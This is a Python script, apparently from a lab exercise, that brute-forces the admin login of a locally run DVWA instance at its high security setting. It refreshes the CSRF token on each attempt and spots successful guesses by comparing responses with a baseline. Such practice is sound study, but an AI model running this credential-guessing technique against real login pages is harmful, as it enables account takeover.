import requests
from bs4 import BeautifulSoup

URL = "http://localhost:8080" # DVWA running on docker
LOGIN_PAGE = f"{URL}/vulnerabilities/brute/"
USERNAME = "admin"

# Burp Suite extracted valid cookie session
COOKIES = {
    "PHPSESSID": "ev333ds3tg8sf25lragbk66n62",
    "security": "high"
}

# Simple list with common passwords
passwords = [
	"123",
	"admin",
	"123456",
	"qwerty",
	"abc123",
	"123456789",
	"pass",
	"password",
	"admin"
]

session = requests.Session()
session.cookies.update(COOKIES)

# Attempt analysis showed that CSRF token is refresh at each request
# Each new attempt should get a new token
def get_token():
    r = session.get(LOGIN_PAGE)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]
    return token


# Baseline generation to understand default invalid response pattern
def get_baseline():
    token = get_token()

    params = {
        "username": USERNAME,
        "password": "invalid_password_123",
        "Login": "Login",
        "user_token": token
    }

    r = session.get(LOGIN_PAGE, params=params)

    return {
        "length": len(r.text),
        "status": r.status_code
    }


baseline = get_baseline()
print(f"[i] Baseline: {baseline}")


def try_login(password):
    token = get_token()

    params = {
        "username": USERNAME,
        "password": password,
        "Login": "Login",
        "user_token": token
    }

    THRESHOLD_FLUCTUATION = 20

    r = session.get(LOGIN_PAGE, params=params)

    current_length = len(r.text)
    current_status = r.status_code

    # Tries to check if the system returns username or password is incorrect
    # This is the first pass to check if the system returned anything different
    content_check = "Username and/or password incorrect" not in r.text

    # Additional validation using response size and status comparison
    # In HIGH DVWA returns status 200 even for incorrect values, the status check has a different function
    # Its main purpose is to avoid bad requests to interfere with the attack
    length_diff = abs(current_length - baseline["length"])
    status_diff = current_status != baseline["status"]

    # Small fluctuations in lengths can happen without any guarantee of success
    # Add a threshold to avoid fluctuations that are too small
    significant_length_change = length_diff > THRESHOLD_FLUCTUATION

    if content_check or significant_length_change or status_diff:
        print(f"[+] POSSIBLE CANDIDATE: {password}")
        print(f"    Length: {current_length} (diff: {length_diff}) | Status: {current_status}")
        return True

    print(f"[-] {password} | Length: {current_length}")
    return False


for pwd in passwords:
    if try_login(pwd):
        break
